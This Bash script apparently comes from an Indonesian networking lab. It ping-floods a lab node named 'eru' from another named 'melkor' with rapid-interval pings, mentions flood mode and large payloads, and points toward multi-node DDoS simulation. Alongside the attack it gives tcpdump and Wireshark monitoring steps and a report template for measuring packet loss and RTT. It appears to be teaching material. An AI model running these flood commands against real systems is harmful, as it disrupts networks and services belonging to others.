#!/bin/bash

echo "=== melakukan ping flooding dari melkor ke eru ==="

# cek ip eru terlebih dahulu 
# misalnya ip eru adalah 10.76.1.1 

# test ping normal terlebih dahulu
echo "1. test ping normal (5 paket):"
ping 10.76.1.1 -c 5

echo ""
echo "============================================"
echo "2. serangan ping flooding (100 paket):"
echo "============================================"

# ping flooding dengan 100 paket
# -c 100 = jumlah paket
# -i 0.01 = interval 0.01 detik
# atau bisa gunakan flood mode dengan -f

# opsi 1: ping dengan interval sangat cepat
ping 10.76.1.1 -c 100 -i 0.01

# opsi 2: ping flood mode 
# ping 10.76.1.1 -c 100 -f

echo ""
echo "============================================"
echo "3. serangan ekstrem (1000 paket dengan flood):"
echo "============================================"

# serangan lebih ekstrem dengan 1000 paket
ping 10.76.1.1 -c 1000 -i 0.001

# ============================================
# analisis hasil
# ============================================

echo ""
echo "============================================"
echo "analisis hasil:"
echo "============================================"
echo "perhatikan output di atas untuk:"
echo "1. packet loss (% loss)"
echo "2. rtt (round trip time):"
echo "   - min (minimum)"
echo "   - avg (average) <-- catat ini"
echo "   - max (maximum)"
echo "   - mdev (standard deviation)"
echo ""

# ============================================
# di node eru 
# ============================================

# buka console eru dan jalankan monitoring
echo "=== monitoring di node eru ==="

# monitor koneksi dan traffic
echo "jalankan di terminal eru saat serangan berlangsung:"
echo "1. monitor dengan tcpdump:"
echo "   tcpdump -i eth0 icmp -n"
echo ""
echo "2. monitor dengan top untuk melihat cpu usage:"
echo "   top"
echo ""
echo "3. check network statistics:"
echo "   netstat -s | grep -i icmp"
echo ""

# ============================================
# wireshark monitoring
# ============================================

echo "=== monitoring dengan wireshark ==="
echo "1. klik kanan pada link antara melkor dan switch/router"
echo "2. start capture"
echo "3. jalankan serangan ping dari melkor"
echo "4. apply display filter:"
echo "   icmp"
echo "   atau"
echo "   ip.addr == 10.76.1.2 && icmp  (ganti dengan ip melkor)"
echo ""
echo "5. amati:"
echo "   - jumlah echo request dan echo reply"
echo "   - time between packets"
echo "   - any dropped packets"
echo ""

# ============================================
# hasil yang diharapkan
# ============================================

cat << 'EOF'

============================================
hasil yang harus dicatat:
============================================

1. packet loss:
   - normal: 0% packet loss
   - saat serangan: mungkin ada % packet loss jika network overwhelmed
   
2. average round trip time (rtt):
   - normal ping (5 paket): 
     rtt min/avg/max/mdev = x/y/z/w ms
     catat nilai "avg" (y)
   
   - ping flooding (100 paket):
     rtt min/avg/max/mdev = x/y/z/w ms
     catat nilai "avg" (y)
     
   - bandingkan: apakah avg rtt meningkat?

3. dampak serangan:
   - apakah server eru menjadi lambat?
   - apakah ada packet loss?
   - apakah rtt meningkat signifikan?
   - apakah services lain (ftp) terpengaruh?

4. kesimpulan:
   serangan ping flooding dapat:
   - meningkatkan latency (rtt)
   - menyebabkan packet loss
   - mengkonsumsi bandwidth
   - membebani cpu server target
   - mengganggu layanan normal

============================================
contoh output yang harus didokumentasikan:
============================================

ping 10.76.1.1 (10.76.1.1) 56(84) bytes of data.
64 bytes from 10.76.1.1: icmp_seq=1 ttl=64 time=0.123 ms
64 bytes from 10.76.1.1: icmp_seq=2 ttl=64 time=0.145 ms
...
64 bytes from 10.76.1.1: icmp_seq=100 ttl=64 time=2.543 ms

--- 10.76.1.1 ping statistics ---
100 packets transmitted, 98 received, 2% packet loss, time 99ms
rtt min/avg/max/mdev = 0.089/1.234/5.678/0.456 ms

catat:
- packet loss: 2%
- average rtt: 1.234 ms (meningkat dari normal ~0.1 ms)

EOF

# ============================================
# laporan
# ============================================

echo ""
echo "============================================"
echo "buat laporan dengan isi:"
echo "============================================"
echo "1. screenshot hasil ping flooding dari melkor"
echo "2. capture wireshark menunjukkan icmp flood"
echo "3. tabel perbandingan:"
echo "   | jenis ping | paket | loss % | avg rtt |"
echo "   |------------|-------|--------|---------|"
echo "   | normal     | 5     | 0%     | 0.1 ms  |"
echo "   | flooding   | 100   | 2%     | 1.2 ms  |"
echo ""
echo "4. analisis dampak terhadap performa eru"
echo "5. kesimpulan tentang efektivitas serangan"
echo ""

# ============================================
# variasi serangan (opsional)
# ============================================

echo "=== variasi serangan lain (opsional) ==="

# ping dengan paket besar
echo "ping dengan payload besar (1000 bytes):"
echo "ping 10.76.1.1 -c 100 -s 1000"
echo ""

# ping flood kontinyu 
echo "ping flood kontinyu (ctrl+c untuk stop):"
echo "ping 10.76.1.1 -f"
echo ""

# ping dari multiple sources 
echo "ddos simulation - ping dari beberapa node sekaligus"
echo ""

echo "=== selesai ==="